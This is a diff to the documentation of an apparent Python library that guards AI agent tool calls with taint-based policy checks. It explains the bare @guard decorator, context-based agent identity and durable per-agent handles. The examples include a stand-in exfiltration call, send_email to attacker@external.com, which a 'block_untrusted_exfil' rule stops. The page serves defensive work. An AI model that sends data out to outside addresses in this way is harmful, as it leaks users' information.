@@ -81,23 +81,37 @@ transformation and what does not.
 
 ## Guard a tool call
 
+Define tools with a bare `@guard`, no agent reference — this is the
+primary pattern. Tools can live in their own module, decorated where
+they're defined:
+
 ```python
-from interbolt import PolicyViolation
+# tools.py
+from interbolt import guard
 
-agent = runtime.agent("support-agent")
-
-@agent.guard
+@guard
 def send_email(to: str, body: str) -> None:
     ...
-
-try:
-    send_email(to="attacker@external.com", body=summary)
-except PolicyViolation as e:
-    print(e.decision.matched_rule)   # "block_untrusted_exfil"
-    print(e.decision.action)         # Action.BLOCK
 ```
 
-`@agent.guard` inspects the bound call arguments, collects every taint label
+Bind the acting agent's identity separately, at the call site, with
+`runtime.agent_context(...)`:
+
+```python
+# main.py
+from interbolt import PolicyViolation
+from tools import send_email
+
+async def handle_request(agent_id: str) -> None:
+    async with runtime.agent_context(agent_id):
+        try:
+            send_email(to="attacker@external.com", body=summary)
+        except PolicyViolation as e:
+            print(e.decision.matched_rule)   # "block_untrusted_exfil"
+            print(e.decision.action)         # Action.BLOCK
+```
+
+`@guard` inspects the bound call arguments, collects every taint label
 found (recursing into containers), and calls `check()` before the wrapped
 function runs:
 
@@ -106,9 +120,36 @@ function runs:
 - `require_approval`: invokes the configured `ApprovalResolver`; if it
   returns `False` (or denies), raises `ApprovalDenied`.
 
-The bare `@guard` decorator works the same way but picks up the agent
-identity from an active `agent_context` (or `"default"` if none is active)
-instead of a durable `AgentHandle`. See [Identity](concepts/identity.md).
+`agent_context` binds `agent_id` in a `contextvars.ContextVar` for the
+duration of the `async with` block, and mints one `run_id` shared by every
+guarded call inside it. Because `ContextVar` state is isolated per `asyncio`
+task, two agents running concurrently — each in its own `agent_context`
+block — never see each other's identity, with no locking required. A
+guarded call made outside any `agent_context` falls back to `"default"`
+(`constants.DEFAULT_AGENT_ID`).
+
+### Durable per-agent handles
+
+For a function that always belongs to one fixed agent, or for guarded calls
+**offloaded to a thread pool** — where a `ContextVar` does not cross the
+thread boundary and `agent_context` cannot reach the call — bind the agent
+at decoration time instead, with `runtime.agent(...)`:
+
+```python
+agent = runtime.agent("support-agent")
+
+@agent.guard
+def send_email(to: str, body: str) -> None:
+    ...
+
+send_email(to="attacker@external.com", body=summary)
+```
+
+`@agent.guard` behaves identically to `@guard` (same taint collection, same
+`check()` call, same `allow`/`block`/`require_approval` handling); the only
+difference is where `agent_id` comes from. The two patterns compose in the
+same codebase. See [Identity](concepts/identity.md) for the full binding
+model, including the thread-offload limit.
 
 ## Next steps
 
